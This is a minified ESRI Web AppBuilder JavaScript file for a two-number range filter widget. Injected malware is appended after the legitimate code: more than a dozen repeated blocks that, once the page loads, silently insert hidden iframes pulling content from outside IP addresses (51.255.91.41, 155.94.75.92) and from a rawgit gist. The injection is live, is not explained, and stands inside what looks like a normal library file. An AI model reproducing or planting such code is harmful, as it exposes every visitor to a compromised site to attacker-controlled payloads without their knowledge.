// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/_filter/TwoNumbersValueProvider.html":'\x3cdiv\x3e\r\n\t\x3ctable data-dojo-attach-point\x3d"numberRangeTable" style\x3d"width:100%;border-collapse:collapse;" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd style\x3d"width:40%;"\x3e\r\n\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"_dijit1" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-attach-event\x3d"blur:_onRangeNumberBlur" data-dojo-props\x3d\'"required":false,intermediateChanges:true,constraints: {pattern: "#####0.##########"}\' style\x3d"width:100%;" /\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd style\x3d"width:20%;text-align:center;"\x3e\r\n\t\t\t\t\t\x3cspan\x3e${nls.and}\x3c/span\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd style\x3d"width:40%;"\x3e\r\n\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"_dijit2" data-dojo-type\x3d"dijit/form/NumberTextBox" data-dojo-attach-event\x3d"blur:_onRangeNumberBlur" data-dojo-props\x3d\'"required":false,intermediateChanges:true,constraints: {pattern: "#####0.##########"}\' style\x3d"width:100%;" /\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/html dojo/_base/declare ./ValueProvider dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./TwoNumbersValueProvider.html dijit/form/NumberTextBox".split(" "),function(c,d,e,f,g,h){return d([e,f,g],{templateString:h,postCreate:function(){this.inherited(arguments);c.addClass(this.domNode,"jimu-two-numbers-filter-value-provider")},_onRangeNumberBlur:function(){if(this._dijit1.validate()&&this._dijit2.validate()){var a=parseFloat(this._dijit1.get("value")),b=parseFloat(this._dijit2.get("value"));
a>b&&(this._dijit1.set("value",b),this._dijit2.set("value",a))}},getDijits:function(){return[this._dijit1,this._dijit2]},setValueObject:function(a){this.isDefined(a.value1)&&this._dijit1.set("value",a.value1);this.isDefined(a.value2)&&this._dijit2.set("value",a.value2)},getValueObject:function(){return this.isValidValue()?{isValid:!0,type:this.partObj.valueObj.type,value1:parseFloat(this._dijit1.get("value")),value2:parseFloat(this._dijit2.get("value"))}:null},tryGetValueObject:function(){if(this.isValidValue())return this.getValueObject();
if(this.isEmptyValue()){var a={isValid:!0,type:this.partObj.valueObj.type,value1:parseFloat(this._dijit1.get("value")),value2:parseFloat(this._dijit2.get("value"))};isNaN(a.value1)&&(a.value1=null);isNaN(a.value2)&&(a.value2=null);return a}return null},setRequired:function(a){this._dijit1.set("required",a);this._dijit2.set("required",a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});